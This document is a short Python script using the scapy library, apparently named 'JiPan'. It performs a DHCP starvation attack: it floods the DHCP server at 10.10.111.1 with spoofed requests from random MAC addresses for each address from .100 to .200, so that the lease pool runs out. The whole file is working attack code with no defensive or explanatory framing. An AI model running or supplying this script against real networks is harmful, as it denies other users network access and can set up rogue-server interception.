# JiPan
import sys
import os
import time
from scapy.all import *

def main():
    layer_broadcast = "ff:ff:ff:ff:ff:ff"
    conf.checkIPaddr = False
    IP_subnet = "10.10.111."

    def dhcp_starvation():
        for ip in range(100, 201):
            for i in range(0, 8):
                bogus_mac_address = RandMAC()
                dhcp_request = Ether(src=bogus_mac_address, dst=layer_broadcast) / IP(src="0.0.0.0",
                                                                                      dst="255.255.255.255") / UDP(
                    sport=68, dport=67) / BOOTP(chaddr=bogus_mac_address) / DHCP(
                    options=[("message-type", "request"), ("server_id", "10.10.111.1"),
                             ("requested_addr", IP_subnet + str(ip)), "end"])
                sendp(dhcp_request)
                print "Now requesting" + IP_subnet + str(ip) + "\n"
                time.sleep(1)

    dhcp_starvation()

if __name__ == "__main__":
    main()


